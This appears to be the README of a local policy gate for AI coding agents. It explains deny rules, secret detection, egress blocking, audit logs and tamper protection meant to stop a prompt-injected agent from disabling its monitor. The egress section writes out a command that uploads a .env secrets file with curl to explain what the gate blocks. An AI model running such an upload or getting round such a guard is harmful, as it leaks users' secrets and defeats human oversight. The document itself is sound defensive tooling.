# @solongate/proxy

A policy gate for AI coding agents. It sits in front of every tool call an agent
makes, every shell command, every file read and every write, and decides whether
it runs, against rules you wrote.

The decision happens on the machine, in a hook the agent calls before it acts.
Nothing is asked over the network on the decision path: the policy is compiled to
Rego and evaluated locally. There is no account, no API key and no telemetry.

Agents: **Claude Code**, **Codex**, **OpenCode**, **Antigravity**.

## Install

Node.js 22 or newer. Nothing to sign in to.

```sh
npm i -g @solongate/proxy
solongate                    # install the guard from the Settings panel
```

Start a new terminal afterwards. Hooks load when a session starts, so
already open terminals are not guarded yet.

## Write a policy

`~/.solongate/policy.json`:

```json
{
  "mode": "denylist",
  "rules": [
    {
      "id": "no-force-push",
      "description": "Rewriting shared history is not an agent's decision",
      "effect": "DENY",
      "priority": 10,
      "enabled": true,
      "toolPattern": "*",
      "commandConstraints": { "denied": ["*push --force*", "*push -f*"] }
    }
  ]
}
```

The next tool call is decided against it. `git push --force` and `git push -f`
are refused from that point, `git push` is not.

`denylist` allows what no rule forbids. `whitelist` refuses what no ALLOW rule
matches. A DENY always beats an ALLOW.

Write `"enabled": true` explicitly: a rule without the field is treated as
disabled by the compiled evaluator.

A `policy.json` beside your working directory is read when the machine has no
file of its own. It may add rules and nothing else, because it lives in a
repository the agent can write to.

## What it enforces

- **Policy rules.** Allow or block by path, command, filename or URL, scoped to
  READ, WRITE, EXECUTE or NETWORK.
- **DLP.** When a call carries a secret, record it, mask it, or refuse the call.
  70 built in patterns plus globs of your own, and three views of every call so
  that splitting a secret across string literals or base64 encoding it does not
  walk past the scanner.
- **Egress.** A transfer command that would upload a local file holding a secret
  is refused. `curl --data-binary @.env <url>` reads the file itself, so the
  secret is in neither the arguments nor the output, and pattern matching alone
  cannot see it.
- **The prompt.** The model also sees what you type and whatever the client
  sweeps into context, and no tool call hook is in that path. A shell shim routes
  `claude` through a local proxy that masks the request body on its way out.
- **Rate limiting.** A cap on tool calls per minute, hour or day.
- **Tamper protection.** The guard's own state cannot be edited by a tool call,
  by any route, including the binary it delegates to.

The last four live in the same file. Wrap the policy and add `security`:

```json
{
  "policy": { "mode": "denylist", "rules": [] },
  "security": {
    "rateLimit": { "perMinute": 60, "perHour": 900 },
    "dlpBlock": { "patterns": ["AWS access key", "Anthropic key"], "custom": [] }
  }
}
```

`dlpRedact` masks without refusing, `dlpObserve` records and changes nothing, and
`rateLimitObserve` counts without blocking.

## Where the record goes

`~/.solongate/local-logs/solongate-audit.jsonl`, owner only, one JSON object per
line. The guard writes a denial before it answers the agent, and the post tool
hook records the rest. What a turn cost goes beside it in
`token-usage-<date>.jsonl`.

Nothing is sent anywhere. There is no service to send it to, and no code left in
the guard that can open a socket.

## The CLI

```
solongate                    the dataroom (policies, audit, settings)
solongate policy             list and edit the policy
solongate dlp                show and edit secret detection
solongate ratelimit          show and edit the rate limit
solongate audit              browse the audit trail
solongate watch              live tail tool calls
solongate trace              what the guard saw in this directory
solongate doctor             what is installed, and whether it is enforcing
solongate repair             restore the guard, hooks and settings files
solongate update             pull the newest version and reinstall it
```

Every one of these reads or changes a security posture, so they require a
terminal on both stdin and stdout, which an agent tool call does not have. The
guard also refuses a tool call that invokes the CLI. A prompt injected agent must
not be able to switch off the thing watching it, and no environment variable
exempts anything from that.

## Documentation

Source, issues and security reporting:
[github.com/solongate/agent-security](https://github.com/solongate/agent-security)

## Licence

Apache License 2.0. See [LICENSE](LICENSE).
